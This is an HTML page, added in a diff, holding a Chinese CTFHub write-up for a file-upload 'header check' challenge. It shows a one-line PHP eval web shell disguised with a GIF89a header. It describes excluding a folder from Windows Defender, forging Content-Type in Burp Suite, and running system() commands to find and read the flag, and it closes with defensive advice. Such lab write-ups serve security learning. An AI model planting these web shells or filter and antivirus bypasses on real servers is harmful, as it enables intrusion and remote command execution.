@@ -1,0 +1,106 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>【CTFHub】Web-文件头检查 Writeup</title>
+    <style>
+        body { font-family: sans-serif; line-height: 1.8; max-width: 800px; margin: 0 auto; padding: 20px; color: #333; background-color: #fcfcfc; }
+        h1 { border-bottom: 2px solid #0366d6; padding-bottom: .3em; color: #0366d6; }
+        h2 { border-bottom: 1px solid #eaecef; padding-bottom: .3em; margin-top: 30px; color: #24292e; }
+        code { background-color: #f6f8fa; padding: 0.2em 0.4em; border-radius: 6px; font-family: monospace; color: #d73a49; }
+        pre { background-color: #f6f8fa; padding: 16px; border-radius: 6px; overflow: auto; font-family: monospace; }
+        .meta { color: #586069; font-size: 0.95em; margin-bottom: 20px; border-bottom: 1px dashed #eaecef; padding-bottom: 10px; }
+        .footer { margin-top: 50px; font-size: 0.9em; color: #586069; border-top: 1px solid #eaecef; padding-top: 10px; text-align: center; }
+        ul, ol { padding-left: 20px; }
+    </style>
+</head>
+<body>
+    <p><a href=" ">← 返回首页</a ></p >
+    <h1>【CTFHub】Web-文件头检查 Writeup</h1>
+    
+    <div class="meta">
+        <p><strong>操作者：</strong>何芊宏 | <strong>操作日期：</strong>2026.9.18 | <strong>分类：</strong>CTF | <strong>标签：</strong>CTFHub, Web, 文件上传, 文件头检查, BurpSuite</p >
+    </div>
+    
+    <h2>1. 题目信息</h2>
+    <ul>
+        <li><strong>平台：</strong>CTFHub</li>
+        <li><strong>分类：</strong>Web - 文件上传 / 文件头检查</li>
+        <li><strong>题目名称：</strong>文件头检查</li>
+        <li><strong>提示：</strong>服务器检测文件开头（魔数），利用图片文件头伪装 PHP 代码</li>
+    </ul>
+
+    <h2>2. 解题思路</h2>
+    <p>本题目的是利用服务器“仅校验文件开头字段（魔数/Magic Bytes），不校验文件后缀和内容”的缺陷。通过魔法字节 <code>GIF89a</code> 伪造文件头绕过检测，配合 Burp Suite 抓包修改 MIME 类型绕过上传点，并利用 POST 请求执行系统命令。期间经历了 HTTP 协议格式错误、文件内容被净化、脚本后缀解析失败等多个实战陷阱。</p >
+
+    <h2>3. 操作步骤</h2>
+    
+    <p><strong>第一步：本地环境构建与杀软拦截（试错1）</strong></p >
+    <p>在 VS Code 中新建 <code>shell.php</code>，写入 <code>GIF89a</code> 和 <code>&lt;?php @eval($_POST['cmd']); ?&gt;</code>。</p >
+    <ul>
+        <li><strong>试错与结果：</strong>保存文件时，Windows Defender 立即弹窗报毒并拦截，导致文件无法在桌面存储超过 30 秒，甚至在上传时提示“文件包含病毒或潜在的垃圾软件，无法成功完成操作”。</li>
+        <li><strong>解决办法：</strong>在 Windows 安全中心添加了排除项 <code>C:\Users\heqianhong\Desktop\muma</code> 文件夹，并将文件移至该目录下，绕过 Defender 监控。</li>
+    </ul>
+
+    <p><strong>第二步：前端与后端文件类型拦截（试错2）</strong></p >
+    <p>直接上传 <code>shell.php</code> 时，网页弹出“文件类型不正确，只允许上传 jpeg jpg png gif 类型的文件”。</p >
+    <ul>
+        <li><strong>试错与结果：</strong>服务器强制限制了后缀/类型，必须抓包修改。</li>
+    </ul>
+
+    <p><strong>第三步：Burp 抓包与修改 Content-Type（试错3）</strong></p >
+    <p>开启 Burp 拦截，在自带浏览器中上传 <code>shell.php</code>。</p >
+    <ul>
+        <li><strong>操作：</strong>拦截后，保留 <code>filename="shell.php"</code>，将 <code>Content-Type: application/x-php</code> 修改为 <code>Content-Type: image/jpeg</code>，放行后提示“上传成功”，路径为 <code>upload/shell.php</code>。</li>
+    </ul>
+
+    <p><strong>第四步：Repeater 连马与 400 Bad Request 泥潭（试错4、5、6）</strong></p >
+    <p>进入 <code>Repeater</code> 尝试执行命令时，经历了新手最痛苦的“HTTP 协议报错地狱”：</p >
+    <ul>
+        <li><strong>错误1（GET/POST混淆）：</strong>误将 <code>?cmd=system("ls /");</code> 拼接到 URL 里直接访问，发的是 GET 请求。而木马只接收 <code>$_POST['cmd']</code>。结果页面空白或只返回 <code>GIF89a</code>，命令未执行。</li>
+        <li><strong>错误2（Content-Length 不匹配）：</strong>手动改造请求体时，忘了 <code>Content-Length</code> 的长度必须和实际请求体一致。BP 自动计算 631 或手动改为 0 时，服务器直接返回 400 Bad Request。</li>
+        <li><strong>错误3（格式混乱）：</strong>请求头与请求体之间没有正确保留空行，且删除了旧的 <code>multipart/form-data</code> 内容后，残留了边界符（如 <code>----WebKitFormBoundary...</code>）。</li>
+        <li><strong>解决办法：</strong>第一行改为 <code>POST /upload/shell.php HTTP/1.1</code>；保留一个空行；请求体只写 <code>cmd=system("ls /");</code>；手动将 <code>Content-Length</code> 精确改为 <strong>19</strong>。</li>
+    </ul>
+
+    <p><strong>第五步：后缀解析与文件净化拉锯战（试错7）</strong></p >
+    <ul>
+        <li><strong>试错1（将 shell.php 改后缀为 shell.jpg）：</strong>成功上传后访问 URL，服务器把它当成静态图片，页面一片空白（或渲染失败），PHP 无法执行。</li>
+        <li><strong>试错2（尝试访问 shell.phtml）：</strong>由于服务器用的是 openresty（默认只解析 .php），访问 .phtml 时，右侧响应直接打印了源码 <code>GIF89a</code> 和 <code>&lt;?php... ?&gt;</code>，说明未被解析。</li>
+        <li><strong>试错3（使用 Content-Type: image/jpeg 上传）：</strong>利用 <code>GIF89a</code> 配合 <code>image/jpeg</code> 成功上传，但在访问时，服务器发现内容是“图片”，调用了图片处理库进行“二次渲染”（净化），把后面的 PHP 代码全删了，只留下了 8 个字节的 <code>GIF89a</code>。</li>
+        <li><strong>解决办法（关键）：</strong>保持 <code>filename="shell.php"</code>，但将 <code>Content-Type</code> 改为 <code>image/gif</code>（或者删掉这一行）。这样既绕过了文件类型校验，又避免了二次渲染，PHP 代码被完整保存。</li>
+    </ul>
+
+    <p><strong>第六步：全盘搜索并读取 Flag（试错8）</strong></p >
+    <ul>
+        <li><strong>操作1：</strong>在 Repeater 中执行 <code>cmd=system("ls /");</code>（长度19），成功回显根目录，但没看到 flag。</li>
+        <li><strong>操作2：</strong>执行 <code>cmd=system("ls -la /");</code>（长度23），查看隐藏文件，依然没找到。</li>
+        <li><strong>操作3（试错）：</strong>执行 <code>cmd=system("find / -name flag*2>/dev/null");</code>（长度44），回显为空。</li>
+        <li><strong>错误原因：</strong><code>flag*</code> 和 <code>2&gt;</code> 之间少了一个空格！导致 find 命令去寻找了名为 <code>flag*2</code> 的文件。</li>
+        <li><strong>修正（成功）：</strong>加上空格，命令改为 <code>cmd=system("find / -name flag* 2>/dev/null");</code>（长度45），成功搜索到路径 <code>/var/www/html/flag_493430573.php</code>。</li>
+        <li><strong>读取 Flag：</strong>执行 <code>cmd=system("cat /var/www/html/flag_493430573.php");</code>（长度51），成功回显 Flag：<code>ctfhub{412034173c2a328463952959}</code>。</li>
+    </ul>
+
+    <h2>4. 踩坑记录与复盘</h2>
+    <ul>
+        <li><strong>Windows Defender 与本地木马（文件隔离）：</strong>本地创建木马时，安全软件会直接拦截。最佳实践是添加白名单文件夹，而不是关闭杀软，防止本地环境遭殃。</li>
+        <li><strong>HTTP 协议严谨性（Content-Length 与空行）：</strong>POST 请求中，Header 与 Body 之间必须有一个空行；<code>Content-Length</code> 必须与请求体的精确字节数一致。改包后最好使用 BP 的 <code>Pretty</code> 视图添加参数，让工具自动计算长度，避免手动修改出错。</li>
+        <li><strong>文件后缀与解析机制：</strong>上传的文件名保持 <code>.php</code> 至关重要。如果改成 <code>.jpg</code> 只能作为静态资源读取；如果服务器（如 openresty）不支持 <code>.phtml</code> 等后缀，就无法解析代码。</li>
+        <li><strong>图片二次渲染（净化）陷阱：</strong>千万不要盲目修改 <code>Content-Type</code> 为 <code>image/jpeg</code>。这会导致服务端调用图像处理引擎对图片进行重绘，从而彻底清除隐藏在其中的 PHP 代码。对于 <code>GIF89a</code> 伪造，配合 <code>image/gif</code> 或干脆不写类型反而更安全。</li>
+        <li><strong>命令细节决定成败：</strong>Linux 命令对空格和特殊符号极其敏感。<code>find / -name flag* 2&gt;/dev/null</code> 中缺一不可，这需要我们在实操中养成严谨的习惯。</li>
+    </ul>
+
+    <h2>5. 知识总结</h2>
+    <ul>
+        <li><strong>文件头（Magic Bytes）绕过：</strong>利用 <code>GIF89a</code> 等图片魔数欺骗服务器的 <code>getimagesize()</code> 或文件头检测函数。</li>
+        <li><strong>MIME 类型绕过：</strong>在 Burp Suite 中修改 <code>Content-Type</code>（如改为 <code>image/gif</code>），以此绕过前端或后端对类型的严格校验。</li>
+        <li><strong>WebShell 命令执行与高级搜索：</strong>利用 <code>system()</code> 函数执行 Linux 命令，利用 <code>find / -name flag* 2&gt;/dev/null</code> 实现全盘静默搜索，利用 <code>cat</code> 读取文件内容。</li>
+        <li><strong>安全防御建议：</strong>防御文件上传漏洞应进行多重校验（白名单后缀 + MIME 类型校验 + 文件内容二次渲染 + 上传目录不可执行权限），彻底杜绝各类文件头伪造和解析漏洞。</li>
+    </ul>
+
+    <div class="footer">
+        <p>Hosted on GitHub Pages</p >
+    </div>
+</body>
+</html>
